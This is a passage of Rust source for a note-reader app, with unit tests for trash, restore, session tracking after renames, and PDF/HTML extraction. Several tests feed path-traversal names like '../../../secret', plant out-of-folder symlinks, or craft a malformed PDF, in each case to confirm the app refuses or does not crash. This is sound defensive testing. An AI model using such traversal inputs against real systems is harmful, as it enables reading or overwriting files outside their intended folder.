        serde_json::to_string(s).unwrap_or_else(|_| s.to_string())
    } else {
        s.to_string()
    }
}

/// A Mac NSURL bookmark for the folder, so a rename of the folder itself can still be opened.
/// Other platforms have nothing equivalent; they store only the path and inode.
pub fn folder_bookmark(folder: &str) -> Option<String> {
    #[cfg(target_os = "macos")]
    {
        bookmark::create(folder)
    }
    #[cfg(not(target_os = "macos"))]
    {
        let _ = folder;
        None
    }
}

fn resolve_bookmark(bookmark: &str) -> Option<String> {
    #[cfg(target_os = "macos")]
    {
        bookmark::resolve(bookmark)
    }
    #[cfg(not(target_os = "macos"))]
    {
        let _ = bookmark;
        None
    }
}

#[cfg(target_os = "macos")]
mod bookmark {
    use objc2::rc::RetainedFromIterator;
    use objc2::runtime::Bool;
    use objc2_foundation::{NSData, NSString, NSURL, NSURLBookmarkCreationOptions, NSURLBookmarkResolutionOptions};

    pub fn create(folder: &str) -> Option<String> {
        let url = NSURL::fileURLWithPath(&NSString::from_str(folder));
        let data = url
            .bookmarkDataWithOptions_includingResourceValuesForKeys_relativeToURL_error(
                NSURLBookmarkCreationOptions::MinimalBookmark,
                None,
                None,
            )
            .ok()?;
        Some(b64_encode(&nsdata_bytes(&data)))
    }

    pub fn resolve(bookmark: &str) -> Option<String> {
        let bytes = b64_decode(bookmark)?;
        let data = NSData::retained_from_iter(bytes);
        let mut stale = Bool::NO;
        let url = unsafe {
            NSURL::URLByResolvingBookmarkData_options_relativeToURL_bookmarkDataIsStale_error(
                &data,
                NSURLBookmarkResolutionOptions::WithoutUI,
                None,
                &mut stale,
            )
        }
        .ok()?;
        url.path().map(|p| p.to_string())
    }

    fn nsdata_bytes(data: &NSData) -> Vec<u8> {
        data.to_vec()
    }

    fn b64_encode(input: &[u8]) -> String {
        const T: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        let mut out = String::with_capacity(input.len().div_ceil(3) * 4);
        let mut i = 0;
        while i < input.len() {
            let b0 = input[i];
            let b1 = input.get(i + 1).copied().unwrap_or(0);
            let b2 = input.get(i + 2).copied().unwrap_or(0);
            out.push(T[(b0 >> 2) as usize] as char);
            out.push(T[(((b0 & 3) << 4) | (b1 >> 4)) as usize] as char);
            out.push(if i + 1 < input.len() { T[(((b1 & 15) << 2) | (b2 >> 6)) as usize] as char } else { '=' });
            out.push(if i + 2 < input.len() { T[(b2 & 63) as usize] as char } else { '=' });
            i += 3;
        }
        out
    }

    fn b64_decode(s: &str) -> Option<Vec<u8>> {
        fn val(c: u8) -> Option<u8> {
            Some(match c {
                b'A'..=b'Z' => c - b'A',
                b'a'..=b'z' => c - b'a' + 26,
                b'0'..=b'9' => c - b'0' + 52,
                b'+' => 62,
                b'/' => 63,
                b'=' => 0,
                _ => return None,
            })
        }
        let bytes = s.as_bytes();
        if !bytes.len().is_multiple_of(4) {
            return None;
        }
        let mut out = Vec::with_capacity(bytes.len() / 4 * 3);
        for chunk in bytes.chunks(4) {
            let a = val(chunk[0])?;
            let b = val(chunk[1])?;
            let c = val(chunk[2])?;
            let d = val(chunk[3])?;
            out.push((a << 2) | (b >> 4));
            if chunk[2] != b'=' {
                out.push((b << 4) | (c >> 2));
            }
            if chunk[3] != b'=' {
                out.push((c << 6) | d);
            }
        }
        Some(out)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn folder() -> tempfile::TempDir {
        tempfile::tempdir().unwrap()
    }

    fn write_md(dir: &Path, name: &str, body: &str) {
        if let Some(parent) = dir.join(name).parent() {
            fs::create_dir_all(parent).unwrap();
        }
        fs::write(dir.join(name), body).unwrap();
    }

    #[test]
    fn restore_page_puts_the_page_and_its_snapshots_back() {
        let dir = folder();
        write_md(dir.path(), "notes/a.md", "# A\n");
        let folder = dir.path().to_str().unwrap();
        let n = snapshot_version(folder, "notes/a.md").unwrap();
        let trashed = delete_page(folder, "notes/a.md").unwrap();
        assert_eq!(trashed, "a");
        assert!(!dir.path().join("notes/a.md").exists());

        // Back even if its folder went away in the meantime.
        fs::remove_dir(dir.path().join("notes")).unwrap();
        restore_page(folder, "notes/a.md", &trashed).unwrap();

        assert_eq!(fs::read_to_string(dir.path().join("notes/a.md")).unwrap(), "# A\n");
        assert_eq!(read_version(folder, "notes/a.md", n).unwrap(), "# A\n");
        assert_eq!(fs::read_dir(dir.path().join(".reader/trash")).unwrap().count(), 0);
    }

    #[test]
    fn restore_page_refuses_to_overwrite_a_file_that_has_since_appeared() {
        let dir = folder();
        write_md(dir.path(), "a.md", "# Old\n");
        let folder = dir.path().to_str().unwrap();
        snapshot_version(folder, "a.md").unwrap();
        let trashed = delete_page(folder, "a.md").unwrap();
        write_md(dir.path(), "a.md", "# New\n");

        let err = restore_page(folder, "a.md", &trashed).unwrap_err().to_string();

        assert_eq!(err, "a.md already exists, so the deleted page stays in .reader/trash.");
        assert_eq!(fs::read_to_string(dir.path().join("a.md")).unwrap(), "# New\n");
        assert_eq!(fs::read_to_string(dir.path().join(".reader/trash/a.md")).unwrap(), "# Old\n");
        // Its snapshots stay with it, ready for a later try.
        assert!(dir.path().join(".reader/trash/a-versions").is_dir());
        assert!(list_versions(folder, "a.md").unwrap().is_empty());
    }

    #[test]
    fn restore_page_brings_back_the_delete_it_was_asked_for() {
        let dir = folder();
        let folder = dir.path().to_str().unwrap();
        write_md(dir.path(), "a.md", "# First\n");
        assert_eq!(delete_page(folder, "a.md").unwrap(), "a");
        write_md(dir.path(), "a.md", "# Second\n");
        assert_eq!(delete_page(folder, "a.md").unwrap(), "a-2");

        restore_page(folder, "a.md", "a-2").unwrap();

        assert_eq!(fs::read_to_string(dir.path().join("a.md")).unwrap(), "# Second\n");
        assert_eq!(fs::read_to_string(dir.path().join(".reader/trash/a.md")).unwrap(), "# First\n");
    }

    /// Snapshots already there belong to a newer page of that name, so the old ones stay parked.
    #[test]
    fn restore_page_leaves_its_snapshots_parked_if_newer_ones_are_in_the_way() {
        let dir = folder();
        write_md(dir.path(), "a.md", "# Old\n");
        let folder = dir.path().to_str().unwrap();
        snapshot_version(folder, "a.md").unwrap();
        let trashed = delete_page(folder, "a.md").unwrap();
        write_md(dir.path(), "a.md", "# New\n");
        let n = snapshot_version(folder, "a.md").unwrap();
        fs::remove_file(dir.path().join("a.md")).unwrap();

        restore_page(folder, "a.md", &trashed).unwrap();

        assert_eq!(fs::read_to_string(dir.path().join("a.md")).unwrap(), "# Old\n");
        assert_eq!(read_version(folder, "a.md", n).unwrap(), "# New\n");
        assert!(dir.path().join(".reader/trash/a-versions").is_dir());
    }

    /// Both names come over IPC, so neither may reach out of its folder.
    #[test]
    fn restore_page_refuses_paths_that_leave_the_folder_or_the_trash() {
        let outer = folder();
        let session = outer.path().join("session");
        write_md(outer.path(), "secret.md", "# Secret\n");
        write_md(&session, "a.md", "# A\n");
        let folder = session.to_str().unwrap();
        let trashed = delete_page(folder, "a.md").unwrap();

        assert!(restore_page(folder, "b.md", "../../../secret").is_err());
        assert!(restore_page(folder, "../b.md", &trashed).is_err());

        assert!(outer.path().join("secret.md").exists());
        assert!(!outer.path().join("b.md").exists());
        assert!(!session.join("b.md").exists());
        assert!(session.join(".reader/trash/a.md").exists());
    }

    #[test]
    fn restore_page_says_so_when_the_trash_no_longer_holds_it() {
        let dir = folder();
        let folder = dir.path().to_str().unwrap();
        let err = restore_page(folder, "a.md", "a").unwrap_err().to_string();
        assert_eq!(err, "The deleted page is no longer in .reader/trash.");
        assert!(!dir.path().join("a.md").exists());
    }

    #[test]
    fn empty_trash_removes_deleted_pages_and_their_snapshots() {
        let dir = folder();
        let folder = dir.path().to_str().unwrap();
        write_md(dir.path(), "a.md", "# A\n");
        write_md(dir.path(), "notes/b.md", "# B\n");
        snapshot_version(folder, "a.md").unwrap();
        delete_page(folder, "a.md").unwrap();
        delete_page(folder, "notes/b.md").unwrap();
        write_md(dir.path(), "a.md", "# A again\n");
        delete_page(folder, "a.md").unwrap();
        assert_eq!(trash_count(folder).unwrap(), 3);

        assert_eq!(empty_trash(folder).unwrap(), 3);

        let trash = dir.path().join(".reader/trash");
        assert!(trash.is_dir());
        assert_eq!(fs::read_dir(&trash).unwrap().count(), 0);
        assert_eq!(trash_count(folder).unwrap(), 0);
    }

    #[test]
    fn empty_trash_leaves_live_pages_and_the_rest_of_reader_alone() {
        let dir = folder();
        let folder = dir.path().to_str().unwrap();
        write_md(dir.path(), "keep.md", "# Keep\n");
        write_md(dir.path(), "gone.md", "# Gone\n");
        let n = snapshot_version(folder, "keep.md").unwrap();
        save_session(folder, &json!({ "trail": ["keep.md"] }), None).unwrap();
        delete_page(folder, "gone.md").unwrap();

        assert_eq!(empty_trash(folder).unwrap(), 1);

        assert_eq!(fs::read_to_string(dir.path().join("keep.md")).unwrap(), "# Keep\n");
        assert_eq!(read_version(folder, "keep.md", n).unwrap(), "# Keep\n");
        assert!(load_session(folder, None).unwrap().is_some());
    }

    #[test]
    fn empty_trash_with_no_trash_folder_is_fine() {
        let dir = folder();
        let folder = dir.path().to_str().unwrap();
        assert_eq!(trash_count(folder).unwrap(), 0);
        assert_eq!(empty_trash(folder).unwrap(), 0);
        assert!(!dir.path().join(".reader").exists());
    }

    /// A link inside the trash goes as a link; what it points at, outside the folder, stays.
    #[cfg(unix)]
    #[test]
    fn empty_trash_does_not_follow_a_link_inside_it() {
        let outer = folder();
        let session = outer.path().join("session");
        write_md(outer.path(), "secret.md", "# Secret\n");
        write_md(outer.path(), "elsewhere/kept.md", "# Kept\n");
        write_md(&session, "a.md", "# A\n");
        let folder = session.to_str().unwrap();
        delete_page(folder, "a.md").unwrap();
        let trash = session.join(".reader/trash");
        std::os::unix::fs::symlink(outer.path().join("secret.md"), trash.join("link.md")).unwrap();
        std::os::unix::fs::symlink(outer.path().join("elsewhere"), trash.join("link-versions")).unwrap();
        fs::create_dir(trash.join("b-versions")).unwrap();
        std::os::unix::fs::symlink(outer.path().join("elsewhere"), trash.join("b-versions/inner")).unwrap();
        assert_eq!(trash_count(folder).unwrap(), 1);

        assert_eq!(empty_trash(folder).unwrap(), 1);

        assert_eq!(fs::read_dir(&trash).unwrap().count(), 0);
        assert_eq!(fs::read_to_string(outer.path().join("secret.md")).unwrap(), "# Secret\n");
        assert_eq!(fs::read_to_string(outer.path().join("elsewhere/kept.md")).unwrap(), "# Kept\n");
    }

    /// A trash folder that is itself a link is left alone rather than emptied wherever it points.
    #[cfg(unix)]
    #[test]
    fn empty_trash_leaves_a_linked_trash_folder_alone() {
        let outer = folder();
        let session = outer.path().join("session");
        write_md(outer.path(), "elsewhere/kept.md", "# Kept\n");
        fs::create_dir_all(session.join(".reader")).unwrap();
        std::os::unix::fs::symlink(outer.path().join("elsewhere"), session.join(".reader/trash")).unwrap();
        let folder = session.to_str().unwrap();

        assert!(trash_count(folder).is_err());
        assert!(empty_trash(folder).is_err());

        assert_eq!(fs::read_to_string(outer.path().join("elsewhere/kept.md")).unwrap(), "# Kept\n");
    }

    /// A folder can ship `.reader` as a link (a cloned repo, an unzipped folder). Session state, the
    /// map, snapshots and deleted pages would all land wherever it points, so nothing goes through it.
    #[cfg(unix)]
    #[test]
    fn a_linked_reader_folder_is_neither_read_nor_written() {
        let outer = folder();
        let session = outer.path().join("session");
        write_md(&session, "a.md", "# A\n");
        write_md(outer.path(), "elsewhere/session.json", "{\"current\":\"planted.md\"}");
        std::os::unix::fs::symlink(outer.path().join("elsewhere"), session.join(".reader")).unwrap();
        let folder = session.to_str().unwrap();
        let refused = ".reader in this folder is a link, so Nested won't read or write through it. Replace it with a plain folder.";

        assert_eq!(load_session(folder, None).unwrap_err().to_string(), refused);
        assert_eq!(save_session(folder, &json!({ "current": "a.md" }), None).unwrap_err().to_string(), refused);
        assert_eq!(save_map(folder, &json!({}), "").unwrap_err().to_string(), refused);
        assert_eq!(snapshot_version(folder, "a.md").unwrap_err().to_string(), refused);
        assert_eq!(delete_page(folder, "a.md").unwrap_err().to_string(), refused);
        assert!(load_map(folder).is_err());
        assert!(trash_count(folder).is_err());

        assert_eq!(fs::read_to_string(session.join("a.md")).unwrap(), "# A\n");
        let mut left: Vec<String> = fs::read_dir(outer.path().join("elsewhere")).unwrap().map(|e| e.unwrap().file_name().to_string_lossy().into_owned()).collect();
        left.sort();
        assert_eq!(left, vec!["session.json"]);
    }

    /// Every listing reads and parses each PDF and HTML file whole, so one huge file would hold up
    /// the folder each time it opens. Past the cap it is left out, and opening it says why.
    #[test]
    fn a_pdf_or_html_file_past_the_size_cap_is_not_read() {
        let dir = folder();
        let folder = dir.path().to_str().unwrap();
        write_md(dir.path(), "a.md", "# A\n");
        for name in ["big.pdf", "big.html"] {
            // Sparse: as big as the cap says, without the disk space.
            fs::File::create(dir.path().join(name)).unwrap().set_len(50 * 1024 * 1024 + 1).unwrap();
        }

        let listed: Vec<String> = list_pages(folder).unwrap().into_iter().map(|p| p.path).collect();
        assert_eq!(listed, vec!["a.md"]);
        assert_eq!(read_page(folder, "big.pdf").err().unwrap().to_string(), "big.pdf is too big to read (51 MB; Nested reads PDF and HTML files up to 50 MB).");
        assert_eq!(read_page(folder, "big.html").err().unwrap().to_string(), "big.html is too big to read (51 MB; Nested reads PDF and HTML files up to 50 MB).");
    }

    #[test]
    fn restore_page_after_the_trash_was_emptied_says_the_page_is_gone() {
        let dir = folder();
        let folder = dir.path().to_str().unwrap();
        write_md(dir.path(), "a.md", "# A\n");
        let trashed = delete_page(folder, "a.md").unwrap();
        empty_trash(folder).unwrap();

        let err = restore_page(folder, "a.md", &trashed).unwrap_err().to_string();

        assert_eq!(err, "The deleted page is no longer in .reader/trash.");
        assert!(!dir.path().join("a.md").exists());
    }

    #[test]
    fn save_session_records_file_ids() {
        let dir = folder();
        write_md(dir.path(), "a.md", "# A\n");
        let folder = dir.path().to_str().unwrap();
        save_session(folder, &json!({ "trail": ["a.md"], "trailIndex": 0 }), None).unwrap();
        let stored = load_session(folder, None).unwrap().unwrap();
        let id = path_id(&dir.path().join("a.md")).expect("unix inode");
        assert_eq!(stored["ids"]["a.md"], id);
    }

    #[test]
    fn resolve_session_follows_a_renamed_page() {
        let dir = folder();
        write_md(dir.path(), "a.md", "# A\n");
        let folder = dir.path().to_str().unwrap();
        let id = path_id(&dir.path().join("a.md")).expect("unix inode");
        fs::create_dir_all(dir.path().join(".reader/versions/a")).unwrap();
        fs::write(
            dir.path().join(".reader/session-a.json"),
            serde_json::to_string(&json!({
                "current": "a.md",
                "trail": ["a.md"],
                "trailIndex": 0,
                "unread": ["a.md"],
                "pending": { "a.md": 1 },
                "ids": { "a.md": id },
            }))
            .unwrap(),
        )
        .unwrap();
        fs::write(dir.path().join(".reader/versions/a/v1.md"), "old\n").unwrap();

        fs::rename(dir.path().join("a.md"), dir.path().join("b.md")).unwrap();

        let mut ids = HashMap::new();
        ids.insert("a.md".into(), id.clone());
        let resolved = resolve_session(folder, Some("a.md"), Some(&ids), None).unwrap();
        assert_eq!(resolved.file.as_deref(), Some("b.md"));
        assert_eq!(resolved.remaps, vec![("a.md".into(), "b.md".into())]);
        assert_eq!(resolved.file_id.as_deref(), Some(id.as_str()));
        assert!(dir.path().join("b.md").is_file());
        assert!(dir.path().join(".reader/session-b.json").is_file());
        assert!(!dir.path().join(".reader/session-a.json").exists());
        assert!(dir.path().join(".reader/versions/b/v1.md").is_file());
        assert!(!dir.path().join(".reader/versions/a").exists());

        let session = load_session(folder, Some("b.md")).unwrap().unwrap();
        assert_eq!(session["current"], "b.md");
        assert_eq!(session["trail"][0], "b.md");
        assert_eq!(session["unread"][0], "b.md");
        assert_eq!(session["pending"]["b.md"], 1);
        assert_eq!(session["ids"]["b.md"], id);
        assert!(session["ids"].get("a.md").is_none());
    }

    #[test]
    fn resolve_session_rewrites_source_in_a_folder_session() {
        let dir = folder();
        write_md(dir.path(), "a.md", "# A\n");
        write_md(dir.path(), "child.md", "---\nsource: a.md\n---\n\n# Child\n");
        let folder = dir.path().to_str().unwrap();
        let id = path_id(&dir.path().join("a.md")).expect("unix inode");
        save_session(
            folder,
            &json!({
                "current": "a.md",
                "trail": ["a.md", "child.md"],
                "trailIndex": 1,
            }),
            None,
        )
        .unwrap();

        fs::rename(dir.path().join("a.md"), dir.path().join("b.md")).unwrap();

        let mut ids = HashMap::new();
        ids.insert("a.md".into(), id);
        let resolved = resolve_session(folder, None, Some(&ids), None).unwrap();
        assert_eq!(resolved.file, None);
        assert_eq!(resolved.remaps, vec![("a.md".into(), "b.md".into())]);

        let session = load_session(folder, None).unwrap().unwrap();
        assert_eq!(session["current"], "b.md");
        assert_eq!(session["trail"][0], "b.md");
        assert_eq!(session["trail"][1], "child.md");
        let child = fs::read_to_string(dir.path().join("child.md")).unwrap();
        assert!(child.contains("source: b.md"), "{child}");
        assert!(!child.contains("source: a.md"), "{child}");
    }

    #[test]
    fn resolve_session_leaves_a_missing_file_without_an_id() {
        let dir = folder();
        write_md(dir.path(), "kept.md", "# Kept\n");
        let folder = dir.path().to_str().unwrap();
        let resolved = resolve_session(folder, Some("gone.md"), None, None).unwrap();
        assert_eq!(resolved.file.as_deref(), Some("gone.md"));
        assert!(resolved.remaps.is_empty());
    }

    /// `~/Desktop/plan.md -> ~/Projects/x/plan.md`: the listing skips links, so a session on the
    /// Desktop never found its own page ("Not a Markdown page: plan.md"). It opens where the file is.
    #[cfg(unix)]
    #[test]
    fn a_file_opened_through_a_symlink_opens_where_it_really_is() {
        let dir = folder();
        let desk = dir.path().join("Desktop");
        write_md(dir.path(), "Projects/x/2026-11-09.md", "# Plan\n");
        fs::create_dir_all(&desk).unwrap();
        std::os::unix::fs::symlink(dir.path().join("Projects/x/2026-11-09.md"), desk.join("today.md")).unwrap();

        let resolved = resolve_session(desk.to_str().unwrap(), Some("today.md"), None, None).unwrap();
        assert_eq!(Path::new(&resolved.folder), fs::canonicalize(dir.path().join("Projects/x")).unwrap());
        assert_eq!(resolved.file.as_deref(), Some("2026-11-09.md"));
        assert!(list_pages(&resolved.folder).unwrap().iter().any(|p| p.path == "2026-11-09.md"));
        // A plain file is left as it was.
        write_md(&desk, "real.md", "# Real\n");
        let plain = resolve_session(desk.to_str().unwrap(), Some("real.md"), None, None).unwrap();
        assert_eq!(plain.folder, desk.to_str().unwrap());
        assert_eq!(plain.file.as_deref(), Some("real.md"));
    }

    #[test]
    fn resolve_session_skips_version_dir_when_destination_exists() {
        let dir = folder();
        write_md(dir.path(), "a.md", "# A\n");
        let folder = dir.path().to_str().unwrap();
        let id = path_id(&dir.path().join("a.md")).expect("unix inode");
        fs::create_dir_all(dir.path().join(".reader/versions/a")).unwrap();
        fs::create_dir_all(dir.path().join(".reader/versions/b")).unwrap();
        fs::write(dir.path().join(".reader/versions/a/v1.md"), "from-a\n").unwrap();
        fs::write(dir.path().join(".reader/versions/b/v1.md"), "from-b\n").unwrap();
        fs::write(
            dir.path().join(".reader/session.json"),
            serde_json::to_string(&json!({ "current": "a.md", "ids": { "a.md": id } })).unwrap(),
        )
        .unwrap();

        fs::rename(dir.path().join("a.md"), dir.path().join("b.md")).unwrap();
        let mut ids = HashMap::new();
        ids.insert("a.md".into(), id);
        let resolved = resolve_session(folder, None, Some(&ids), None).unwrap();
        assert_eq!(resolved.remaps, vec![("a.md".into(), "b.md".into())]);
        assert_eq!(fs::read_to_string(dir.path().join(".reader/versions/a/v1.md")).unwrap(), "from-a\n");
        assert_eq!(fs::read_to_string(dir.path().join(".reader/versions/b/v1.md")).unwrap(), "from-b\n");
    }

    #[test]
    fn nested_pdf_fixture_extracted() {
        // This test uses the fixture at .unlazy/fixtures/sample.pdf
        let fixture_path = Path::new(env!("CARGO_MANIFEST_DIR"))
            .parent()
            .unwrap()
            .join(".unlazy/fixtures/sample.pdf");
        
        if !fixture_path.exists() {
            panic!("Fixture not found: {:?}", fixture_path);
        }
        
        let text = extract_pdf_text(&fixture_path).unwrap();
        println!("Extracted PDF text: {}", text);
        assert!(text.contains("Nested PDF Fixture"), 
            "Expected 'Nested PDF Fixture' in extracted text, got: {}", text);
    }

    #[test]
    fn pdf_structure_and_reflow_external() {
        // This test uses an external PDF to verify structure extraction and paragraph consolidation.
        // The PDF is not committed to the repo due to size.
        // To run: place cadence-travel-ai-risk-and-readiness-2026-09-26-2ecp_3a5c.pdf in /tmp/cadence-test.pdf
        let test_pdf = Path::new("/tmp/cadence-test.pdf");
        
        if !test_pdf.exists() {
            eprintln!("Skipping pdf_structure_and_reflow_external: test PDF not found at /tmp/cadence-test.pdf");
            return;
        }
        
        let text = extract_pdf_text(test_pdf).unwrap();
        
        // Verify text was extracted
        assert!(!text.is_empty(), "PDF text should not be empty");
        assert!(text.len() > 10000, "PDF should extract substantial text, got {} chars", text.len());
        
        // Verify structure: should have Markdown headings
        let h1_count = text.matches("\n# ").count();
        let h2_count = text.matches("\n## ").count();
        let h3_count = text.matches("\n### ").count();
        let total_headings = h1_count + h2_count + h3_count;
        
        println!("PDF extraction: {} chars, {} H1, {} H2, {} H3 (total {} headings)",
            text.len(), h1_count, h2_count, h3_count, total_headings);
        
        assert!(total_headings > 0, "Expected at least some Markdown headings, got none");
        assert!(h1_count < 100, "Too many H1 headings ({}), heuristics too aggressive", h1_count);
        
        // Verify paragraph consolidation: find a known body paragraph starting with "Cadence's biggest"
        if let Some(pos) = text.find("Cadence's biggest") {
            // Look for this specific paragraph
            let sample_start = text[..pos].rfind("\n\n").map(|p| p + 2).unwrap_or(pos);
            let sample_end = text[pos..].find("\n\n").map(|p| pos + p).unwrap_or(text.len());
            let paragraph = &text[sample_start..sample_end];
            
            println!("\nSample body paragraph ({} chars):\n{}\n", 
                paragraph.len(), 
                &paragraph[..paragraph.len().min(400)]);
            
            // This paragraph should be consolidated into flowing prose (multiple sentences, 400+ chars)
            assert!(paragraph.len() > 300, 
                "Expected consolidated paragraph (>300 chars), got {} chars", 
                paragraph.len());
            assert!(paragraph.contains("Commission bookings") && paragraph.contains("advisors"),
                "Expected known paragraph content");
            println!("✓ Paragraph consolidated ({} chars, spans multiple sentences)", paragraph.len());
        }
        
        // Verify recognizable content
        let lower_text = text.to_lowercase();
        assert!(lower_text.contains("cadence") || lower_text.contains("ai"),
            "Expected recognizable PDF content");
    }

    #[test]
    fn nested_html_fixture_extracted() {
        // This test uses the fixture at .unlazy/fixtures/sample.html
        let fixture_path = Path::new(env!("CARGO_MANIFEST_DIR"))
            .parent()
            .unwrap()
            .join(".unlazy/fixtures/sample.html");
        
        if !fixture_path.exists() {
            panic!("Fixture not found: {:?}", fixture_path);
        }
        
        let text = extract_html_text(&fixture_path).unwrap();
        println!("Extracted HTML text: {}", text);
        assert!(text.contains("Nested HTML Fixture"),
            "Expected 'Nested HTML Fixture' in extracted text, got: {}", text);
    }

    #[test]
    fn list_pages_includes_pdf_files() {
        let dir = folder();
        write_md(dir.path(), "a.md", "# Markdown\n");
        
        // Copy the test fixture PDF
        let fixture_path = Path::new(env!("CARGO_MANIFEST_DIR"))
            .parent()
            .unwrap()
            .join(".unlazy/fixtures/sample.pdf");
        fs::copy(&fixture_path, dir.path().join("test.pdf")).unwrap();
        
        let folder = dir.path().to_str().unwrap();
        let pages = list_pages(folder).unwrap();
        assert_eq!(pages.len(), 2);
        let paths: Vec<&str> = pages.iter().map(|p| p.path.as_str()).collect();
        assert!(paths.contains(&"a.md"));
        assert!(paths.contains(&"test.pdf"));
    }

    #[test]
    fn list_pages_includes_html_files() {
        let dir = folder();
        write_md(dir.path(), "a.md", "# Markdown\n");
        fs::write(
            dir.path().join("test.html"),
            "<html><body><h1>Test HTML</h1><p>Content here.</p></body></html>"
        ).unwrap();
        
        let folder = dir.path().to_str().unwrap();
        let pages = list_pages(folder).unwrap();
        assert_eq!(pages.len(), 2);
        let paths: Vec<&str> = pages.iter().map(|p| p.path.as_str()).collect();
        assert!(paths.contains(&"a.md"));
        assert!(paths.contains(&"test.html"));
    }

    /// A one-page PDF whose page draws `content`, with no fonts of its own.
    fn one_page_pdf(content: &str) -> Vec<u8> {
        let objects = [
            "<< /Type /Catalog /Pages 2 0 R >>".to_string(),
            "<< /Type /Pages /Kids [3 0 R] /Count 1 >>".to_string(),
            "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Contents 4 0 R >>".to_string(),
            format!("<< /Length {} >>\nstream\n{content}\nendstream", content.len()),
        ];
        let mut out = b"%PDF-1.4\n".to_vec();
        let mut offsets = Vec::new();
        for (i, object) in objects.iter().enumerate() {
            offsets.push(out.len());
            out.extend_from_slice(format!("{} 0 obj\n{object}\nendobj\n", i + 1).as_bytes());
        }
        let xref = out.len();
        out.extend_from_slice(format!("xref\n0 {}\n0000000000 65535 f \n", objects.len() + 1).as_bytes());
        for offset in offsets {
            out.extend_from_slice(format!("{offset:010} 00000 n \n").as_bytes());
        }
        out.extend_from_slice(format!("trailer\n<< /Size {} /Root 1 0 R >>\nstartxref\n{xref}\n%%EOF\n", objects.len() + 1).as_bytes());
        out
    }

    /// A scan has no text layer. It can't be read or asked about, but the folder's notes can.
    #[test]
    fn a_folder_with_a_scanned_pdf_still_lists_its_notes() {
        let dir = folder();
        write_md(dir.path(), "notes.md", "# Notes\n");
        fs::write(dir.path().join("scan.pdf"), one_page_pdf("")).unwrap();
        // An old note saved as Latin-1 isn't UTF-8 either.
        fs::write(dir.path().join("latin.md"), b"# Caf\xe9\n").unwrap();
        let folder = dir.path().to_str().unwrap();
        let paths: Vec<String> = list_pages(folder).unwrap().into_iter().map(|p| p.path).collect();
        assert_eq!(paths, vec!["notes.md"]);
        // read_page still says why for each.
        assert!(read_page(folder, "latin.md").is_err());
        assert!(read_page(folder, "scan.pdf").map(|p| p.raw).unwrap_err().to_string().contains("no extractable text"));
    }

    /// pdf-extract panics on some malformed files: here, text shown before any font is set. A release
    /// build aborts on a panic, so one such PDF in a folder closed the app whenever the folder opened.
    #[test]
    fn a_pdf_the_parser_chokes_on_is_an_error_not_a_crash() {
        let dir = folder();
        write_md(dir.path(), "notes.md", "# Notes\n");
        fs::write(dir.path().join("broken.pdf"), one_page_pdf("BT 10 10 Td (Hello) Tj ET")).unwrap();
        let folder = dir.path().to_str().unwrap();
        let listed = std::panic::catch_unwind(|| list_pages(folder).map(|pages| pages.into_iter().map(|p| p.path).collect::<Vec<_>>()));
        let listed = listed.expect("listing the folder panicked");
        assert!(listed.is_ok(), "{:?}", listed.err().map(|e| e.to_string()));
        assert!(listed.unwrap().contains(&"notes.md".to_string()));
        let read = std::panic::catch_unwind(|| read_page(folder, "broken.pdf").map(|p| p.raw));
        assert!(read.is_ok(), "reading the PDF panicked");
    }

    /// `catch_unwind` can only catch a panic that unwinds. With `panic = "abort"` in the release
    /// profile, the guard above would hold in `cargo test` and still crash the app people run.
    #[test]
    fn release_builds_unwind_so_a_parser_panic_can_be_caught() {
        let manifest = include_str!("../Cargo.toml");
        let release = manifest.split("[profile.release]").nth(1).unwrap_or("").split("\n[").next().unwrap_or("");
        assert!(!release.contains("panic = \"abort\""), "[profile.release] aborts on panic");
    }

    #[test]
    fn read_pdf_extracts_text() {
        let dir = folder();
        
        // Copy the test fixture PDF
        let fixture_path = Path::new(env!("CARGO_MANIFEST_DIR"))
            .parent()
            .unwrap()
            .join(".unlazy/fixtures/sample.pdf");
        fs::copy(&fixture_path, dir.path().join("sample.pdf")).unwrap();
        
        let folder = dir.path().to_str().unwrap();
        let page = read_page(folder, "sample.pdf").unwrap();
        assert_eq!(page.path, "sample.pdf");
        assert!(page.raw.contains("Nested PDF Fixture"));
    }

    #[test]
    fn read_html_extracts_text() {
        let dir = folder();
        fs::write(
            dir.path().join("sample.html"),
            "<html><head><title>Test</title></head><body><h1>Welcome</h1><p>This is a test.</p></body></html>"
        ).unwrap();
        
        let folder = dir.path().to_str().unwrap();
        let page = read_page(folder, "sample.html").unwrap();
        assert_eq!(page.path, "sample.html");
        assert!(page.raw.contains("Welcome"));
        assert!(page.raw.contains("test"));
    }

    #[test]
    fn write_new_page_writes_a_page_that_is_not_there_yet() {
        let dir = folder();
        let folder = dir.path().to_str().unwrap();

        assert!(write_new_page(folder, "new/a.md", "# A\n").unwrap());

        assert_eq!(fs::read_to_string(dir.path().join("new/a.md")).unwrap(), "# A\n");
    }

    /// A note saved from another editor since the last listing must survive a new page of its name.
    #[test]
    fn write_new_page_leaves_a_file_already_there_byte_for_byte() {
        let dir = folder();
        let folder = dir.path().to_str().unwrap();
        let note = "---\ntitle: Sleep\n---\n# Sleep\n\nMy own notes, \u{2014} not the app's.\r\n";
        write_md(dir.path(), "sleep.md", note);

        assert!(!write_new_page(folder, "sleep.md", "# Sleep\n\n").unwrap());

        assert_eq!(fs::read(dir.path().join("sleep.md")).unwrap(), note.as_bytes());
        assert_eq!(fs::read_dir(dir.path()).unwrap().count(), 1);
    }

    /// macOS volumes ignore case, so `sleep.md` there is the reader's own `Sleep.md`.
    #[test]
    fn write_new_page_leaves_a_case_twin_alone_where_the_volume_ignores_case() {
        let dir = folder();
        let folder = dir.path().to_str().unwrap();
        write_md(dir.path(), "Sleep.md", "# Mine\n");
        let ignores_case = dir.path().join("SLEEP.md").exists();

        let written = write_new_page(folder, "sleep.md", "# Sleep\n\n").unwrap();

        assert_eq!(written, !ignores_case);
        assert_eq!(fs::read_to_string(dir.path().join("Sleep.md")).unwrap(), "# Mine\n");
    }

    #[test]
    fn write_new_page_refuses_a_path_that_leaves_the_folder() {
        let outer = folder();
        let session = outer.path().join("session");
        fs::create_dir_all(&session).unwrap();

        assert!(write_new_page(session.to_str().unwrap(), "../escape.md", "# X\n").is_err());

        assert!(!outer.path().join("escape.md").exists());
    }

    /// A cloned repo or an unzipped folder can carry symlinks to anywhere on disk. A page path is
    /// read or written only where it really sits inside the folder; a link to one of its own pages
    /// still works.
